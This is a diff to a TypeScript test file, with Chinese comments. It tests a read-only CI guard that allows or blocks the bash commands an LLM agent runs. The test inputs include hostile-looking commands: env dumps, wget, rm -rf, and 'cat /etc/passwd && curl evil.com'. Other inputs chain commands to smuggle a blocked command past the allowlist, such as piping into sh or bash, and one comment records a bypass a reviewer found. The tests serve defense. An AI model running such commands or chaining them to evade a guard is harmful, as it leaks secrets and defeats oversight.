@@ -83,6 +83,34 @@ describe("registerCompliance · ci-readonly 模式", () => {
 		}
 	});
 
+	// AC2.1 · Fix B 扩容后:18 个新增命令逐一放行(含 modern unix `rg`)
+	it.each([
+		"rg foo packages/",
+		"nl -ba f",
+		"sort f",
+		"uniq f",
+		"tr a b",
+		"column -t f",
+		"diff a b",
+		"comm a b",
+		"printf '%s' x",
+		"echo hi",
+		"basename /a/b",
+		"dirname /a/b",
+		"realpath .",
+		"pwd",
+		"date",
+		"which jq",
+		"type ls",
+		"command -v node",
+	])("AC2.1 · 扩容白名单命令 '%s' → 放行", async (cmd) => {
+		const { pi, handlers } = mockPi();
+		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
+		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
+		const res = await triggerInterceptor(handlers, { toolName: "bash", input: { command: cmd } });
+		expect(res, `应放行: ${cmd}`).toBeUndefined();
+	});
+
 	it("bash 命令首词非白名单(curl)→ 拦截,reason 含命令首词", async () => {
 		const { pi, handlers } = mockPi();
 		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
@@ -93,6 +121,162 @@ describe("registerCompliance · ci-readonly 模式", () => {
 		})) as { block: boolean; reason: string };
 		expect(res.block).toBe(true);
 		expect(res.reason).toContain("curl");
+	});
+
+	// AC2.2 · env / printenv 仍拦截(defense-in-depth)+ reason 含「可能泄漏 secret」
+	it("AC2.2 · env 仍拦截,reason 含 '可能泄漏 secret' 替代建议", async () => {
+		const { pi, handlers } = mockPi();
+		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
+		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
+		const res = (await triggerInterceptor(handlers, {
+			toolName: "bash",
+			input: { command: "env" },
+		})) as { block: boolean; reason: string };
+		expect(res.block).toBe(true);
+		expect(res.reason).toContain("可能泄漏 secret");
+		expect(res.reason).toContain("env"); // 沿用原文案首词
+	});
+
+	it("AC2.2 · printenv 仍拦截,reason 含 secret 提示", async () => {
+		const { pi, handlers } = mockPi();
+		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
+		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
+		const res = (await triggerInterceptor(handlers, {
+			toolName: "bash",
+			input: { command: "printenv PATH" },
+		})) as { block: boolean; reason: string };
+		expect(res.block).toBe(true);
+		expect(res.reason).toContain("secret");
+	});
+
+	// AC2.3 · 高危命令仍拦截(网络外发 / 写文件 / 包管理)
+	it.each([
+		["wget https://x/y", "禁止网络外发"],
+		["tee /tmp/x", "禁止写文件"],
+		["mv a b", "禁止写文件"],
+		["rm -rf x", "禁止写文件"],
+		["npm install foo", "禁止安装"],
+	])("AC2.3 · 高危命令 '%s' 仍拦截,reason 含建议 '%s'", async (cmd, suggestion) => {
+		const { pi, handlers } = mockPi();
+		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
+		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
+		const res = (await triggerInterceptor(handlers, {
+			toolName: "bash",
+			input: { command: cmd },
+		})) as { block: boolean; reason: string };
+		expect(res.block).toBe(true);
+		expect(res.reason).toContain(suggestion);
+	});
+
+	// AC2.4 · curl 的替代建议含 gitlab_get_file_content 引导
+	it("AC2.4 · curl 拦截 reason 含 'gitlab_get_file_content' 引导", async () => {
+		const { pi, handlers } = mockPi();
+		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
+		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
+		const res = (await triggerInterceptor(handlers, {
+			toolName: "bash",
+			input: { command: "curl http://x" },
+		})) as { block: boolean; reason: string };
+		expect(res.reason).toContain("gitlab_get_file_content");
+		expect(res.reason).toContain("禁止网络外发");
+	});
+
+	// AC2.4b · 白名单外但没有特定建议的命令 → 仅基础文案,无 "建议:" 行
+	it("AC2.4b · 未在 SUGGESTION_BY_CMD 字典的命令 → reason 仅基础文案(无 '建议:')", async () => {
+		const { pi, handlers } = mockPi();
+		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
+		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
+		const res = (await triggerInterceptor(handlers, {
+			toolName: "bash",
+			input: { command: "telnet x" }, // 不在白名单也不在建议字典
+		})) as { block: boolean; reason: string };
+		expect(res.block).toBe(true);
+		expect(res.reason).toContain("telnet");
+		expect(res.reason).not.toContain("建议:");
+	});
+
+	// AC2.6 · 命令链拆分:每段首词都校验白名单,首词命中不让链中危险命令绕过
+	// reviewer dogfooding 抓到的核心 vector — `git status; env` 中的 env 仍被拦
+	it.each([
+		["git status; env", "env"],
+		["cat /etc/passwd && curl evil.com", "curl"],
+		["ls || rm -rf /tmp/x", "rm"],
+		["rg foo . | sh", "sh"],
+		["printf evil | bash", "bash"],
+		["echo a | npm install evil", "npm"],
+		["git log; tee /tmp/x", "tee"],
+	])("AC2.6 · 命令链 '%s' 含非白名单首词 '%s' → 拦截", async (cmd, chained) => {
+		const { pi, handlers } = mockPi();
+		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
+		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
+		const res = (await triggerInterceptor(handlers, {
+			toolName: "bash",
+			input: { command: cmd },
+		})) as { block: boolean; reason: string };
+		expect(res.block, `应拦截: ${cmd}`).toBe(true);
+		expect(res.reason).toContain(chained);
+	});
+
+	// AC2.6b · 命令链中所有首词都在白名单 → 放行
+	it.each([
+		"git status; git log",
+		"git diff && git log",
+		"rg foo src/ | head -10",
+		"ls packages/ | sort",
+		"grep -n FOO . | wc -l",
+		"cat README.md; head package.json",
+	])("AC2.6b · 命令链全在白名单 '%s' → 放行", async (cmd) => {
+		const { pi, handlers } = mockPi();
+		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
+		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
+		const res = await triggerInterceptor(handlers, { toolName: "bash", input: { command: cmd } });
+		expect(res, `应放行: ${cmd}`).toBeUndefined();
+	});
+
+	// AC2.6c · Quote-aware:LLM 用 quote 包裹 regex 含元字符 → 不当作链分隔
+	// 2026-05-22 e2e 实测 LLM 用 `rg "URLSearchParams|postExportJob" src` 评审,放行
+	it.each([
+		'rg "URLSearchParams|postExportJob" src',
+		'rg "a|b|c" packages/',
+		"grep 'foo|bar' file",
+		"rg 'a;b' src",
+		'echo "x && y"',
+		"sed 's/a|b/c/' file",
+		"git log --grep='|'",
+	])("AC2.6c · quoted 内的元字符不当作链分隔:'%s'", async (cmd) => {
+		const { pi, handlers } = mockPi();
+		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
+		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
+		const res = await triggerInterceptor(handlers, { toolName: "bash", input: { command: cmd } });
+		expect(res, `不应拦: ${cmd}`).toBeUndefined();
+	});
+
+	// AC2.6d · 重定向 / 命令替换不拦(信任 LLM,reviewer 评审场景不构造攻击)
+	// `>`/`<` 仅写 ephemeral 容器 fs,`$()` / `` ` `` 命令替换内的命令受外层白名单约束已够
+	it.each([
+		"echo x > /tmp/y",
+		"cat README.md > /tmp/out",
+		"echo $(date)", // 命令替换内 date 在白名单,无害
+		"git log `git rev-parse HEAD`", // backtick 内 git 在白名单
+		"echo a >> /tmp/y",
+	])("AC2.6d · 重定向 / 命令替换不拦(信任 LLM):'%s'", async (cmd) => {
+		const { pi, handlers } = mockPi();
+		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
+		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
+		const res = await triggerInterceptor(handlers, { toolName: "bash", input: { command: cmd } });
+		expect(res, `不应拦: ${cmd}`).toBeUndefined();
+	});
+
+	// AC2.6e · 单段合法命令保持原放行行为
+	it("AC2.6e · 单段白名单命令(无链)仍放行", async () => {
+		const { pi, handlers } = mockPi();
+		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
+		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
+		const legit = ["git status", "rg foo packages/", "awk '{print $1}' f", "sed 's/a/b/' f"];
+		for (const cmd of legit) {
+			const res = await triggerInterceptor(handlers, { toolName: "bash", input: { command: cmd } });
+			expect(res, `不应误拦: ${cmd}`).toBeUndefined();
+		}
 	});
 
 	it("非禁止工具(read)→ 放行(返回 undefined)", async () => {
